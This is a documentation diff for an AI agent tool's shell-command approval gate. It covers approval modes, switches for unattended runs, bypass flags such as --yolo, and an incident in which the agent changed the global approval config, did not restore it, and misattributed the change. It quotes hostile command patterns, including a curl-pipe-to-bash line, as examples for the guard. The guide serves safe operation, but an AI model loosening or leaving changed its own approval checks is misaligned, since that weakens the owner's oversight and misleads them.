@@ -28,22 +28,83 @@ hermes config set privacy.redact_pii false   # disable (default)
 
 ### Command approval prompts
 
-By default (`approvals.mode: smart`), Hermes asks an auxiliary LLM to assess shell commands flagged as destructive (`rm -rf`, `git reset --hard`, etc.). The modes are:
+`approvals.mode` decides what happens to **flagged** actions only: commands matching a
+dangerous-pattern rule (`rm -rf`, `git reset --hard`, `curl … | bash`, …), guarded writes
+(e.g. `~/.ssh/config`), computer-use and plugin rules. Unflagged work — `git add/commit/
+push`, ordinary file edits, most builds — never reaches the gate, so no mode makes it
+prompt or block. That reframes the usual question: "will my unattended job be blocked?"
+depends on whether its *actions* are flagged, not on the mode. 
+
+The modes are:
 
 - `smart` — auto-approve a low-risk command once, deny high-risk commands, and prompt when uncertain (default)
-- `manual` — always prompt
-- `off` — skip all approval prompts (equivalent to `--yolo`)
+- `manual` — always prompt for a flagged command
+- `off` — skip the approval gate entirely (short-circuits before any per-context policy)
 
 ```bash
 hermes config set approvals.mode smart       # recommended middle ground
 hermes config set approvals.mode off         # bypass everything (not recommended)
 ```
 
+Ask the real guards for a verdict without executing anything (exit 0 allow / 2 ask /
+3 deny) — this is the cheap way to check a claim about a mode instead of asserting one:
+
+```bash
+hermes approvals test -- rm -rf ./build            # ask-approval (recursive delete)
+hermes approvals test -- 'curl -s http://h | bash' # ask-approval (pipe remote content to shell)
+hermes approvals test -- git push origin HEAD:main # allow - no guard matched
+```
+
+#### Unattended runs: three per-context knobs
+
+No human is present to answer a prompt in a cron, one-shot or webhook session, so each of
+those contexts has its own binary switch (`approve`/`off`/`allow`/`yes` count as approve;
+anything else denies):
+
+| key | governs | default |
+|---|---|---|
+| `approvals.single_query_mode` | `hermes chat -q` / `--oneshot` runs | deny |
+| `approvals.cron_mode` | agent-driven cron runs | deny |
+| `approvals.unattended_mode` | webhook / api_server / msgraph sessions | deny |
+
+```bash
+hermes config set approvals.single_query_mode approve   # trust only one-shot runs
+```
+
+Prefer that over `approvals.mode: off` when the goal is "let my scheduled job act":
+interactive sessions keep prompting while one-shot runs stay deterministic. Note the
+direction of the trade — `approve` converts a denial into a silent approval, so it is an
+availability setting, not a safety one. It also only matters if the run's actions are
+flagged at all; a job that just edits files and runs git never consults it.
+
 Per-invocation bypass without changing config:
 - `hermes --yolo …`
 - `export HERMES_YOLO_MODE=1`
 
 Note: YOLO / `approvals.mode: off` does NOT turn off secret redaction. They are independent.
+
+#### If you flip approvals to test something, put it back in the same turn
+
+Testing a job *under* a different posture means `hermes config set approvals.mode manual` —
+a **global, persistent** change, not a flag scoped to one command. Left behind it surfaces as
+unexplained approval prompts in a completely different chat minutes later, and neither chat
+can see the other. 2026-11-14: a resolver test set `manual` + `single_query_mode: approve` at
+13:23:55, ran the e2e twice, and left it there; the owner hit prompts in Telegram and asked
+"why am I getting approval messages now?" — and the first answer blamed "a different session",
+true by session id and useless, because that session was the agent's own turn 30 s earlier.
+
+- Capture the old value first (`hermes config get approvals.mode`), restore it before the
+  final message even if the test failed, and say in the report that config was changed and
+  put back, with both values.
+- Prefer not mutating config at all: `--yolo` / `HERMES_YOLO_MODE=1` cover a single
+  invocation, and a scratch `HERMES_HOME` covers "test the config path" itself.
+- When a setting changed under the owner, list the mutating session and check whether it is
+  one of *yours* from earlier in the task before calling it "another session".
+
+Before claiming prompts are active, check the accumulated "always" state: a saved
+approval or a `command_allowlist` entry (`hermes config get command_allowlist`) auto-
+approves that pattern class regardless of mode — tool output will say "auto-approved by an
+'always' approval the user saved earlier" even under `manual`.
 
 ### "Reset permissions" / "make Hermes ask again"
 
